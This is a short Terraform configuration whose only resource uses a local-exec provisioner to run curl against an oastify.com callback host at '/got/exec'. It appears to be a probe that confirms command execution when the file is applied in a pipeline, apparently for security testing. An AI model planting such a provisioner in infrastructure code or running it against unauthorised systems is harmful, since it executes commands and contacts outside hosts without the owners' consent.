resource "terraform_data" "example2" {
  provisioner "local-exec" {
    command = "curl http://xhiqq42cn3kwvvhlm4lmn5k69xfo3fr4.oastify.com/got/exec"
  }
}
